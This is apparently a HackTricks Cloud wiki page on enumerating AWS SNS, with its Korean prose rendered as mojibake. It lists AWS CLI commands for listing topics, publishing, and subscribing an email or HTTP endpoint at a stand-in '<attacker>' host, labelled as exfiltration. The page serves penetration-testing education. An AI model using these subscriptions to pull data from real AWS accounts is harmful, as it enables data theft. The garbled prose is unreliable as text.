# AWS - SNS Enum

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## SNS

Amazon Simple Notification Service (Amazon SNS)ëŠ” **ì™„ì „ ê´€ë¦¬í˜• ë©”ì‹œì§• ì„œë¹„ìŠ¤**ë¡œ ì„¤ëª…ë©ë‹ˆë‹¤. ì´ëŠ” **ì• í”Œë¦¬ì¼€ì´ì…˜ ê°„** (A2A) ë° **ì• í”Œë¦¬ì¼€ì´ì…˜ ëŒ€ ê°œì¸** (A2P) í†µì‹  ìœ í˜•ì„ ëª¨ë‘ ì§€ì›í•©ë‹ˆë‹¤.

A2A í†µì‹ ì„ ìœ„í•œ ì£¼ìš” ê¸°ëŠ¥ì—ëŠ” **ê²Œì‹œ/êµ¬ë… (pub/sub) ë©”ì»¤ë‹ˆì¦˜**ì´ í¬í•¨ë©ë‹ˆë‹¤. ì´ëŸ¬í•œ ë©”ì»¤ë‹ˆì¦˜ì€ **ì£¼ì œ**ë¥¼ ë„ì…í•˜ì—¬ ë†’ì€ ì²˜ë¦¬ëŸ‰ì˜ **í‘¸ì‹œ ê¸°ë°˜, ë‹¤ëŒ€ë‹¤ ë©”ì‹œì§•**ì„ ê°€ëŠ¥í•˜ê²Œ í•©ë‹ˆë‹¤. ì´ ê¸°ëŠ¥ì€ ë¶„ì‚° ì‹œìŠ¤í…œ, ë§ˆì´í¬ë¡œì„œë¹„ìŠ¤ ë° ì´ë²¤íŠ¸ ê¸°ë°˜ ì„œë²„ë¦¬ìŠ¤ ì•„í‚¤í…ì²˜ì™€ ê´€ë ¨ëœ ì‹œë‚˜ë¦¬ì˜¤ì—ì„œ ë§¤ìš° ìœ ë¦¬í•©ë‹ˆë‹¤. ì´ëŸ¬í•œ ì£¼ì œë¥¼ í™œìš©í•¨ìœ¼ë¡œì¨ ê²Œì‹œ ì‹œìŠ¤í…œì€ **ê´‘ë²”ìœ„í•œ êµ¬ë… ì‹œìŠ¤í…œ**ì— ë©”ì‹œì§€ë¥¼ íš¨ìœ¨ì ìœ¼ë¡œ ë°°í¬í•˜ì—¬ íŒ¬ì•„ì›ƒ ë©”ì‹œì§• íŒ¨í„´ì„ ì´‰ì§„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### **Difference with SQS**

**SQS**ëŠ” **í ê¸°ë°˜** ì„œë¹„ìŠ¤ë¡œ, í¬ì¸íŠ¸ íˆ¬ í¬ì¸íŠ¸ í†µì‹ ì„ í—ˆìš©í•˜ì—¬ ë©”ì‹œì§€ê°€ **ë‹¨ì¼ ì†Œë¹„ì**ì— ì˜í•´ ì²˜ë¦¬ë˜ë„ë¡ ë³´ì¥í•©ë‹ˆë‹¤. ì´ëŠ” **ìµœì†Œ í•œ ë²ˆ ì „ë‹¬**ì„ ì œê³µí•˜ë©°, í‘œì¤€ ë° FIFO íë¥¼ ì§€ì›í•˜ê³ , ì¬ì‹œë„ ë° ì§€ì—° ì²˜ë¦¬ë¥¼ ìœ„í•œ ë©”ì‹œì§€ ë³´ì¡´ì„ í—ˆìš©í•©ë‹ˆë‹¤.\
ë°˜ë©´ì— **SNS**ëŠ” **ê²Œì‹œ/êµ¬ë… ê¸°ë°˜ ì„œë¹„ìŠ¤**ë¡œ, ë©”ì‹œì§€ë¥¼ **ì—¬ëŸ¬ êµ¬ë…ì**ì—ê²Œ ë™ì‹œì— ë°©ì†¡í•˜ì—¬ **ì¼ëŒ€ë‹¤** í†µì‹ ì„ ê°€ëŠ¥í•˜ê²Œ í•©ë‹ˆë‹¤. ì´ëŠ” **ì´ë©”ì¼, SMS, Lambda í•¨ìˆ˜ ë° HTTP/HTTPS**ì™€ ê°™ì€ ë‹¤ì–‘í•œ êµ¬ë… ì—”ë“œí¬ì¸íŠ¸ë¥¼ ì§€ì›í•˜ë©°, ëª©í‘œ ë©”ì‹œì§€ ì „ë‹¬ì„ ìœ„í•œ í•„í„°ë§ ë©”ì»¤ë‹ˆì¦˜ì„ ì œê³µí•©ë‹ˆë‹¤.\
ë‘ ì„œë¹„ìŠ¤ ëª¨ë‘ ë¶„ì‚° ì‹œìŠ¤í…œì˜ êµ¬ì„± ìš”ì†Œ ê°„ì˜ ë¶„ë¦¬ë¥¼ ê°€ëŠ¥í•˜ê²Œ í•˜ì§€ë§Œ, SQSëŠ” í í†µì‹ ì— ì¤‘ì ì„ ë‘ê³ , SNSëŠ” ì´ë²¤íŠ¸ ê¸°ë°˜ íŒ¬ì•„ì›ƒ í†µì‹  íŒ¨í„´ì„ ê°•ì¡°í•©ë‹ˆë‹¤.

### **Enumeration**
```bash
# Get topics & subscriptions
aws sns list-topics
aws sns list-subscriptions
aws sns list-subscriptions-by-topic --topic-arn <arn>

# Check privescs & post-exploitation
aws sns publish --region <region> \
--topic-arn "arn:aws:sns:us-west-2:123456789012:my-topic" \
--message file://message.txt

# Exfiltrate through email
## You will receive an email to confirm the subscription
aws sns subscribe --region <region> \
--topic-arn arn:aws:sns:us-west-2:123456789012:my-topic \
--protocol email \
--notification-endpoint my-email@example.com

# Exfiltrate through web server
## You will receive an initial request with a URL in the field "SubscribeURL"
## that you need to access to confirm the subscription
aws sns subscribe --region <region>\
--protocol http \
--notification-endpoint http://<attacker>/ \
--topic-arn <arn>
```
{% hint style="danger" %}
**ì£¼ì œì˜ ìœ í˜•ì´ FIFOì¸ ê²½ìš°**, **SQS** í”„ë¡œí† ì½œì„ ì‚¬ìš©í•˜ëŠ” êµ¬ë…ìë§Œ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ (HTTP ë˜ëŠ” HTTPSëŠ” ì‚¬ìš©í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤).

ë˜í•œ, `--topic-arn`ì— ì§€ì—­ì´ í¬í•¨ë˜ì–´ ìˆë”ë¼ë„ **`--region`**ì—ì„œ ì˜¬ë°”ë¥¸ ì§€ì—­ì„ ì§€ì •í•´ì•¼ í•˜ë©°, ê·¸ë ‡ì§€ ì•Šìœ¼ë©´ ì ‘ê·¼ ê¶Œí•œì´ ì—†ë‹¤ëŠ” ì˜¤ë¥˜ê°€ ë°œìƒí•˜ì§€ë§Œ ë¬¸ì œëŠ” ì§€ì—­ì…ë‹ˆë‹¤.
{% endhint %}

#### ì¸ì¦ë˜ì§€ ì•Šì€ ì ‘ê·¼

{% content-ref url="../aws-unauthenticated-enum-access/aws-sns-unauthenticated-enum.md" %}
[aws-sns-unauthenticated-enum.md](../aws-unauthenticated-enum-access/aws-sns-unauthenticated-enum.md)
{% endcontent-ref %}

#### ê¶Œí•œ ìƒìŠ¹

{% content-ref url="../aws-privilege-escalation/aws-sns-privesc.md" %}
[aws-sns-privesc.md](../aws-privilege-escalation/aws-sns-privesc.md)
{% endcontent-ref %}

#### í¬ìŠ¤íŠ¸ ìµìŠ¤í”Œë¡œì‡

{% content-ref url="../aws-post-exploitation/aws-sns-post-exploitation.md" %}
[aws-sns-post-exploitation.md](../aws-post-exploitation/aws-sns-post-exploitation.md)
{% endcontent-ref %}

#### ì§€ì†ì„±

{% content-ref url="../aws-persistence/aws-sns-persistence.md" %}
[aws-sns-persistence.md](../aws-persistence/aws-sns-persistence.md)
{% endcontent-ref %}

## ì°¸ê³ ìë£Œ

* [https://aws.amazon.com/about-aws/whats-new/2022/01/amazon-sns-attribute-based-access-controls/](https://aws.amazon.com/about-aws/whats-new/2022/01/amazon-sns-attribute-based-access-controls/)

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŒì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}
